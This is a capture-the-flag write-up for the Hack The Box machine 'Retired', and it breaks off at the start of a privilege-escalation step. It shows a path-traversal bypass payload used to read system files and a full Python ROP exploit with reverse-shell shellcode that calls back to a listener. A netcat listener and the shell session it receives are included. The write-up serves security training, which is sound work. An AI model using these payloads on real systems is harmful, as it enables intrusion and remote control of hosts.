# [retired](https://app.hackthebox.com/machines/Retired)

---

## Open Port Enumeration

### TCP

The target's TCP ports 22 and 80 are open.

```bash
$ sudo masscan -p1-65535 --rate=1000 -e tun0 --output-format grepable --output-filename enum/retired.masscan 10.129.160.64
$ cat enum/retired.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

According to the OpenSSH banner, the target's operating system appears to be Debian.

Nginx is running on port 80.

```bash
$ nmap -sC -sV -p22,80 -oA enum/retired 10.129.160.64
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-05 18:05 UTC
Nmap scan report for ip-10-129-160-64.us-east-2.compute.internal (10.129.160.64)
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.03 seconds
```

### UDP

There are no open UDP ports.

```bash
$ sudo nmap -sU 10.129.160.64
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-05 17:44 UTC
Nmap scan report for ip-10-129-160-64.us-east-2.compute.internal (10.129.160.64)
Host is up (0.028s latency).
Not shown: 999 closed ports
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 998.99 seconds
```

---

## Port 80 Enumeration

`/` redirects to `/index.php?page=default.html`, which advertises a group of retired carpenters who are now developing software full time. They have developed OSTRICH, a next generation handheld gaming console. The website also advertises EMUEMU, the official software emulator of OSTRICH consoles. It is currently in beta for purchasers of OSTRICH systems.

### Content Discovery

`/beta.html` is interesting.

```bash
$ gobuster dir -u http://10.129.160.64 -w /usr/share/wordlists/raft-small-words.txt -x php,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.160.64
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
2022/04/05 19:04:26 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 162] [--> http://10.129.160.64/js/]
/index.php            (Status: 302) [Size: 0] [--> /index.php?page=default.html]
/css                  (Status: 301) [Size: 162] [--> http://10.129.160.64/css/]
/assets               (Status: 301) [Size: 162] [--> http://10.129.160.64/assets/]
/default.html         (Status: 200) [Size: 11414]
/beta.html            (Status: 200) [Size: 4144]
/.                    (Status: 302) [Size: 0] [--> /index.php?page=default.html]

===============================================================
2022/04/05 19:09:03 Finished
===============================================================
```

### `/beta.html`

This page describes the beta testing program for EMUEMU. It says that owners of OSTRICH consoles can use their OSTRICH license with EMUEMU "via the `activate_license` application." It indicates that "license files contain a 512 bit key."
The page contains a form to upload the license file, which `POST`s to `/activate_license`.

![](images/Pasted%20image%2020220405185820.png)

### Arbitrary File Read Vulnerability - `index.php`

`/index.php` appears to leverage the `page` query parameter to determine which file to render to the user. Exploit this vulnerability to read `index.php`'s source:

```http
GET /index.php?page=index.php HTTP/1.1
Host: 10.129.160.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 05 Apr 2022 18:27:34 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 348

<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

It returns the contents of the file at the query parameter `page` as long as it begins with a lowercase letter. It also removes all `./` and `../`, *unrecursively*. This restriction can be bypassed by beginning the path with one of the directories in the web root (i.e., `js/`) and nesting the traversal sequences by replacing all `../`'s with `.....///`'s.

```http
GET /index.php?page=js/.....///.....///.....///.....///etc/passwd HTTP/1.1
Host: 10.129.160.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 05 Apr 2022 23:35:46 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1488

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

### Source of `activate_license.php`

```http
GET /index.php?page=activate_license.php HTTP/1.1
Host: 10.129.160.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 05 Apr 2022 18:53:06 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 585

<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

`activate_license.php` writes the uploaded file size and bytes to `localhost`:`1337`. It doesn't attempt to retrieve any output.

[Enumeration via /proc](https://idafchev.github.io/enumeration/2018/03/05/linux_proc_enum.html): Read `/proc/sched_debug` to enumerate the running processes. PID 421, whose name begins with `activate_licens`, seems interesting.

```http
GET /index.php?page=js/.....///.....///.....///.....///proc/sched_debug HTTP/1.1
Host: 10.129.160.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 05 Apr 2022 23:42:11 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 26752

 S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
-------------------------------------------------------------------------------------------------------------
...
 S activate_licens   421    336868.613426        23   120         0.000000         8.903720         0.000000 0 0 /
...
```

Process 421's command line is `/usr/bin/activate_license1337`. This is likely the process running on `localhost`:`1337`.

```http
GET /index.php?page=js/.....///.....///.....///.....///proc/421/cmdline HTTP/1.1
Host: 10.129.160.64
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 05 Apr 2022 23:43:33 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 31

/usr/bin/activate_license1337
```

Download this file.

```bash
$ curl -s -k -X $'GET' \
    -H $'Host: 10.129.160.64' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://10.129.160.64/index.php?page=js/.....///.....///.....///.....///proc/421/exe' -o activate_license1337

$ file activate_license1337
activate_license1337: gzip compressed data, max speed, from Unix, original size modulo 2^32 22536

$ mv activate_license1337 activate_license1337.gz

$ gzip -d activate_license1337.gz
```

---

## `activate_license1337` Binary Exploitation

### Basic Static Analysis

`activate_license1337` is a dynamically linked 64-bit ELF.

```bash
$ file activate_license1337
activate_license1337: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped
```

The binary is compiled with full RELRO, NX, and PIE.

```bash
$ /opt/checksec.sh/checksec --file=activate_license1337
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   100) Symbols      No    0               3               activate_license1337
```

ASLR is also enabled on the target.

```http
GET /index.php?page=js/.....///.....///.....///.....///proc/sys/kernel/randomize_va_space HTTP/1.1
Host: 10.129.160.141
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 06 Apr 2022 16:44:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 2

2
```

Printable strings indicate interaction with a SQLite database, `license.sqlite`. There is a `CREATE TABLE` and `INSERT` statement for the `license` table.

```bash
/lib64/ld-linux-x86-64.so.2
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
sqlite3_reset
sqlite3_errmsg
sqlite3_exec
sqlite3_bind_text
sqlite3_finalize
sqlite3_close
sqlite3_open
sqlite3_busy_timeout
sqlite3_step
sqlite3_prepare_v2
socket
exit
htonl
htons
__isoc99_sscanf
inet_ntop
puts
fork
listen
__errno_location
bind
read
stderr
__sysv_signal
fwrite
fprintf
accept
__cxa_finalize
strerror
__libc_start_main
ntohl
libsqlite3.so.0
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
u/UH
[]A\A]A^A_
Error: %s
[+] reading %d bytes
license.sqlite/index.php?page=js/.....///.....///.....///.....///proc/sched_debug
CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,   license_key TEXT)
INSERT INTO license (license_key) VALUES (?)
[+] activated license: %s
specify port to bind to
[+] starting server listening on port %d
[+] listening ...
Error: accepting client
[+] accepted client connection from %s:%d
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
/usr/include/x86_64-linux-gnu/bits
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/netinet
/usr/include
/usr/include/x86_64-linux-gnu/bits/types
activate_license.c
types.h
stdint-uintn.h
stddef.h
socket.h
sockaddr.h
in.h
signal.h
sqlite3.h
struct_FILE.h
FILE.h
socket_type.h
stdio.h
__off_t
_IO_read_ptr
_chain
size_t
IPPROTO_MTP
IPPROTO_PIM
_shortbuf
IPPROTO_DCCP/index.php?page=js/.....///.....///.....///.....///proc/sched_debug
IPPROTO_TP
_IO_buf_base
__sighandler_t
SOCK_NONBLOCK
IPPROTO_ENCAP
IPPROTO_IGMP
in_addr_t
activate_license.c
server
IPPROTO_RSVP
SOCK_PACKET
sockfd
long long int
IPPROTO_UDP
long long unsigned int
_fileno
_IO_read_end
_flags
_IO_buf_end
_cur_column
SOCK_STREAM
_IO_codecvt
sqlite3_stmt
double
IPPROTO_BEETPH
_old_offset
__uint32_t
sin_zero
IPPROTO_COMP
_IO_marker
SOCK_RDM
IPPROTO_IPIP
s_addr
_freeres_buf
IPPROTO_ESP
_IO_write_ptr
IPPROTO_RAW
short unsigned int
sin_addr
_IO_save_base
_lock
_flags2
_mode
IPPROTO_IPV6
sin_family
sqlite3
_IO_write_end
IPPROTO_MAX
_IO_lock_t
_IO_FILE
SOCK_DCCP
msglen
sin_port
sa_family
clientaddrlen
_markers
__socket_type
IPPROTO_PUP
IPPROTO_SCTP
unsigned char
GNU C99 10.2.1 20210110 -m64 -mtune=generic -march=x86-64 -g -std=c99 -fno-stack-protector -fPIC -fasynchronous-unwind-tables
IPPROTO_IDP
short int
_vtable_offset
error
IPPROTO_UDPLITE
clientaddr
__socklen_t
IPPROTO_EGP
__uint16_t
buffer
__off64_t
IPPROTO_ICMP
_IO_read_base
_IO_save_end
clientaddr_s
IPPROTO_GRE
serverfd
__pad5
sa_family_t
_unused2
stderr
argv
SOCK_CLOEXEC
sockaddr
SOCK_DGRAM
sockaddr_in
IPPROTO_MPLS
IPPROTO_TCP
_IO_backup_base
IPPROTO_AH
argc
sa_data
_freeres_list
SOCK_RAW
clientfd
_IO_wide_data
SOCK_SEQPACKET
main
_IO_write_base
in_port_t
/mnt/data/files/copy/home/dev/activate_license
IPPROTO_IP
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
activate_license.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
inet_ntop@GLIBC_2.2.5
sqlite3_busy_timeout
__errno_location@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
sqlite3_reset
puts@GLIBC_2.2.5
sqlite3_exec
_edata
sqlite3_open
error
htons@GLIBC_2.2.5
htonl@GLIBC_2.2.5
activate_license
close@GLIBC_2.2.5
read@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
sqlite3_errmsg
__data_start
sqlite3_step
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
sqlite3_close
_IO_stdin_used
__sysv_signal@GLIBC_2.2.5
__libc_csu_init
__isoc99_sscanf@GLIBC_2.7
listen@GLIBC_2.2.5
__bss_start
main
bind@GLIBC_2.2.5
sqlite3_bind_text
sqlite3_finalize
accept@GLIBC_2.2.5
sqlite3_prepare_v2
exit@GLIBC_2.2.5
fwrite@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
ntohl@GLIBC_2.2.5
strerror@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
fork@GLIBC_2.2.5
stderr@GLIBC_2.2.5
socket@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
.debug_aranges
.debug_info
.debug_abbrev
.debug_line
.debug_str
```

### Basic Dynamic Analysis

- Requires a single command-line argument, the port number to listen on
- Parent process listens on port and dispatches children processes to handle client requests

### Source Code Analysis

Client requests are handled by the `activate_license` function. This function reads the data sent by `activate_license.php` into a 512-byte, stack-allocated buffer. Even though it knows the size of the data, it doesn't perform a size check before transfering the data into the buffer. By providing a file greater than 512 bytes, it is possible to overflow the buffer.

### Exploit Development

Local experimentation indicates the instruction pointer lies at offset 520 from the beginning of the payload. By sending a payload greater than or equal to 528 bytes, bytes 520 through 528 will overwrite the instruction pointer, granting control over the program's execution flow. At the point of instruction pointer overwrite, RSP is the only register pointing at the buffer.

The binary is compiled with PIE and the target has ASLR enabled, making it impossible to rely on hardcoded addresses. The binary is also compiled with the NX bit set, making it impossible to execute shellcode on the stack.

However, the web application's arbitrary file read vulnerability makes it possible to read the target process's memory map, leaking the binary and `libc` base addresses. This makes it possible to bypass PIE and ASLR.

The arbitrary file read vulnerability can also be used to leak the address range of the process's stack section. These addresses can be combined with a ROP gadget that uses [mprotect](https://man7.org/linux/man-pages/man2/mprotect.2.html) to make the stack section executable, bypassing NX. Control flow can then be directed back at RSP, where arbitrary shellcode can be executed.

### Exploitation

The target process's binary base address is `0x55f68e56d000`, `libc` base address is `0x0x7f3e90696000`, and stack address range is `0x7f3e909d1000`  through `0x7f3e909d2000`.

```bash
$ curl 'http://10.129.128.14/index.php?page=js/.....///.....///.....///.....///proc/421/maps'
55f68e56d000-55f68e56e000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
55f68e56e000-55f68e56f000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
55f68e56f000-55f68e570000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55f68e570000-55f68e571000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55f68e571000-55f68e572000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
55f68f3ca000-55f68f3eb000 rw-p 00000000 00:00 0                          [heap]
7f3e90528000-7f3e9052a000 rw-p 00000000 00:00 0
7f3e9052a000-7f3e9052b000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f3e9052b000-7f3e9052d000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f3e9052d000-7f3e9052e000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f3e9052e000-7f3e9052f000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f3e9052f000-7f3e90530000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f3e90530000-7f3e90537000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f3e90537000-7f3e90547000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f3e90547000-7f3e9054c000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f3e9054c000-7f3e9054d000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f3e9054d000-7f3e9054e000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f3e9054e000-7f3e90552000 rw-p 00000000 00:00 0
7f3e90552000-7f3e90561000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f3e90561000-7f3e905fb000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f3e905fb000-7f3e90694000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f3e90694000-7f3e90695000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f3e90695000-7f3e90696000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f3e90696000-7f3e906bb000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3e906bb000-7f3e90806000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3e90806000-7f3e90850000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3e90850000-7f3e90851000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3e90851000-7f3e90854000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3e90854000-7f3e90857000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f3e90857000-7f3e9085b000 rw-p 00000000 00:00 0
7f3e9085b000-7f3e9086b000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f3e9086b000-7f3e90963000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f3e90963000-7f3e90997000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f3e90997000-7f3e9099b000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f3e9099b000-7f3e9099e000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f3e9099e000-7f3e909a0000 rw-p 00000000 00:00 0
7f3e909a5000-7f3e909a6000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f3e909a6000-7f3e909c6000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f3e909c6000-7f3e909ce000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f3e909cf000-7f3e909d0000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f3e909d0000-7f3e909d1000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f3e909d1000-7f3e909d2000 rw-p 00000000 00:00 0
7ffc14c54000-7ffc14c75000 rw-p 00000000 00:00 0                          [stack]
7ffc14cbf000-7ffc14cc3000 r--p 00000000 00:00 0                          [vvar]
7ffc14cc3000-7ffc14cc5000 r-xp 00000000 00:00 0                          [vdso]
```

Exploit the arbitrary file read vulnerability to download the target's `libc`.

```bash
$ curl -s 'http://10.129.128.14/index.php?page=js/.....///.....///.....///.....///usr/lib/x86_64-linux-gnu/libc-2.31.so' --output libc-2.31.so
$ ls libc-2.31.so
libc-2.31.so
```

The following script can be used to exploit the buffer overflow vulnerability.

```python
import argparse
import io

from pwnlib.elf.elf import ELF
from pwnlib.util.packing import p64
import requests


# Parse command line arguments
parser = argparse.ArgumentParser(description="Foothold exploit for HTB Retired")
parser.add_argument("target_ip", help="FQDN or IP address of Retired box")
parser.add_argument("binary_path", help="Local path to activate_license1337 binary")
parser.add_argument("libc_path", help="Local path to libc shared object file")
parser.add_argument("--binary-base-addr", type=lambda x: int(x, 16), help="Base address of activate_license1337 (in hex)")
parser.add_argument("--libc-base-addr", type=lambda x: int(x, 16), help="Base address of libc (in hex)")
parser.add_argument("--stack-base-addr", type=lambda x: int(x, 16), help="Base address of stack segment (in hex)")
parser.add_argument("--stack-end-addr", type=lambda x: int(x, 16), help="Final address of stack segment (in hex)")
args = parser.parse_args()

# Base addresses from /proc/$PID/maps
elf = ELF(args.binary_path)
libc = ELF(args.libc_path)
elf.address = args.binary_base_addr
libc.address = args.libc_base_addr
stack_address_begin = args.stack_base_addr
stack_address_end = args.stack_end_addr

# Dynamic addresses
pop_rdi_ret_address = next(elf.search(b"\x5f\xc3", executable=True))
pop_rsi_ret_address = next(libc.search(b"\x5e\xc3", executable=True))
pop_rdx_ret_address = next(libc.search(b"\x5a\xc3", executable=True))
jmp_esp_address = next(libc.search(b"\x54\xc3", executable=True))

# Build payload
payload  = b"A" * 520						# 520 is RIP offset

payload += p64(pop_rdi_ret_address)
payload += p64(stack_address_begin)
payload += p64(pop_rsi_ret_address)
payload += p64(stack_address_end - stack_address_begin)
payload += p64(pop_rdx_ret_address)
payload += p64(7)
payload += p64(libc.sym["mprotect"])		# Set the stack's executable bit with mprotect

payload += p64(jmp_esp_address)				# jmp esp instruction to get back to shellcode

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.100 LPORT=443 EXITFUNC=thread -f python -b '\x00'
payload += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
payload += b"\xef\xff\xff\xff\x48\xbb\xc5\xcb\x5f\x48\x24\x67\xb0"
payload += b"\x4d\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
payload += b"\xaf\xe2\x07\xd1\x4e\x65\xef\x27\xc4\x95\x50\x4d\x6c"
payload += b"\xf0\xf8\xf4\xc7\xcb\x5e\xf3\x2e\x6d\xbe\x29\x94\x83"
payload += b"\xd6\xae\x4e\x77\xea\x27\xef\x93\x50\x4d\x4e\x64\xee"
payload += b"\x05\x3a\x05\x35\x69\x7c\x68\xb5\x38\x33\xa1\x64\x10"
payload += b"\xbd\x2f\x0b\x62\xa7\xa2\x31\x67\x57\x0f\xb0\x1e\x8d"
payload += b"\x42\xb8\x1a\x73\x2f\x39\xab\xca\xce\x5f\x48\x24\x67"
payload += b"\xb0\x4d"

response = requests.post(
    f"http://{args.target_ip}/activate_license.php",
    files={"licensefile": ("tgihf.txt", io.BytesIO(payload), "application/octet-stream")}
)
```

Start a reverse shell listener.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
```

Put it all together:

```bash
$ python3 exploit.py 10.129.128.14 activate_license1337 libc-2.31.so --binary-base-addr 0x55f68e56d000 --libc-base-addr 0x7f3e90696000 --stack-base-addr 0x7ffc14c54000 --stack-end-addr 0x7ffc14c75000
```

Receive a reverse shell as `www-data`.

```bash
$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.100] from (UNKNOWN) [10.129.128.14] 33002
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## `systemd` Timer & Symbolic Link Privilege Escalation

`website_backup.timer` is a non-standard `systemd` timer.

```bash
www-data@retired:/var/www$ systemctl list-timers --all
NEXT                        LEFT          LAST                        PASSED              UNIT                         ACTIVATES
Tue 2022-04-12 21:13:00 UTC 50s left      Tue 2022-04-12 21:12:03 UTC 5s ago              website_backup.timer         website_backup.service
Tue 2022-04-12 21:16:48 UTC 4min 39s left n/a                         n/a                 systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Tue 2022-04-12 21:39:00 UTC 26min left    Tue 2022-04-12 21:09:03 UTC 3min 5s ago         phpsessionclean.timer        phpsessionclean.service
Tue 2022-04-12 22:13:52 UTC 1h 1min left  Mon 2022-03-28 11:12:56 UTC 2 weeks 1 days ago  fstrim.timer                 fstrim.service
Wed 2022-04-13 00:00:00 UTC 2h 47min left Tue 2022-04-12 21:01:53 UTC 10min ago           logrotate.timer              logrotate.service
Wed 2022-04-13 00:00:00 UTC 2h 47min left Tue 2022-04-12 21:01:53 UTC 10min ago           man-db.timer                 man-db.service
Wed 2022-04-13 06:30:02 UTC 9h left       Tue 2022-04-12 21:03:43 UTC 8min ago            apt-daily-upgrade.timer      apt-daily-upgrade.service
Wed 2022-04-13 06:53:08 UTC 9h left       Fri 2022-03-11 15:32:28 UTC 1 months 1 days ago apt-daily.timer              apt-daily.service
Sun 2022-04-17 03:10:43 UTC 4 days left   Tue 2022-04-12 21:02:32 UTC 9min ago            e2scrub_all.timer            e2scrub_all.service

9 timers listed.
```

```bash
www-data@retired:/var/www$ find / -name website_backup.service 2>/dev/null
/etc/systemd/system/website_backup.service
www-data@retired:/var/www$ find / -name website_backup.timer 2>/dev/null
/etc/systemd/system/multi-user.target.wants/website_backup.timer
/etc/systemd/system/website_backup.timer
```

`dev` executes `usr/bin/webbackup` as `dev` every minute.

```bash
www-data@retired:/var/www$ cat /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website

[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup

[Install]
WantedBy=multi-user.target
```

```bash
